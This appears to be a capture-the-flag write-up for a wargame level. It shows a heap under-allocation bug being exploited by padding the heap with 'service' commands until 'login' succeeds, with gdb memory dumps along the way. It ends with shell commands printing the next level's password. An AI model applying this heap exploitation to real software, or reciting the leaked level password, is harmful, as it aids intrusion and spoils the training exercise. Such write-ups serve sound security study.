@@ -1,0 +1,43 @@
+(gdb) disassemble main
+
+lol, binary ninja.
+
+The program creates a structure named auth, containing an int named auth.
+When the user user auth command, the program must allocate for the structure with size of the auth structure, but it gets confused and allocates with int auth size.
+
+ struct auth {
+  char name[32];
+  int auth;
+};
+
+When the user uses login, the program checks auth->auth if != null,
+Since the program allocated just 8bytes for the struct, i used “service” to fill up the heap to the point where auth->auth should be, auth->name + 0x20.
+
+auth abdou
+0x804a008, (nil)
+0x804a000:	0x00000000	0x00000011	0x6f646261	0x00000a75
+0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+
+service a
+0x804a008, 0x804a018
+0x804a000:	0x00000000	0x00000011	0x6f646261	0x00000a75
+0x804a010:	0x00000000	0x00000011	0x000a6120	0x00000000
+0x804a020:	0x00000000	0x00020fe1	0x00000000	0x00000000
+
+service a
+0x804a008, 0x804a028
+0x804a000:	0x00000000	0x00000011	0x6f646261	0x00000a75
+0x804a010:	0x00000000	0x00000011	0x000a6120	0x00000000
+0x804a020:	0x00000000	0x00000011	0x000a6120	0x00000000
+0x804a030:	0x00000000	0x00020fd1	0x00000000	0x00000000
+
+login
+$ whoami
+level9
+$ cd ..
+$ cd level9
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
